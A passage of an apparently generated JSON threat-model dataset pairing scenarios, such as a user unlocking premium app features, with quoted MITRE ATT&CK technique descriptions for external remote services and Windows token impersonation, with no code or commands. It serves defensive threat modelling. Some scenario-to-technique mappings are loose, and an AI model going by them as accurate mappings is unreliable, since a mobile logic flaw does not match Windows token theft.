                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a flaw in the app to gain premium features normally restricted.",
            "Assumptions": [
                {
                    "Assumption": "Application code flaws",
                    "Role": "App Developer",
                    "Condition": "Coding errors or logic flaws exist"
                },
                {
                    "Assumption": "No role-based access controls",
                    "Role": "App Developer",
                    "Condition": "Access controls are not properly implemented"
                },
                {
                    "Assumption": "User has some technical knowledge",
                    "Role": "User",
                    "Condition": "Users can exploit technical flaws"
                }
            ],
            "Potential Impact": "Manipulation of app features and potential misuse of premium functionality.",
            "MITRE ATT&CK Keywords": [
                "app exploitation",
                "privilege abuse",
                "mobile",
                "access control"
            ],
            "mitre_technique": {
                "name": "Token Impersonation/Theft",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                "technique_id": "T1134.001"
            }
        }
    ]
}
]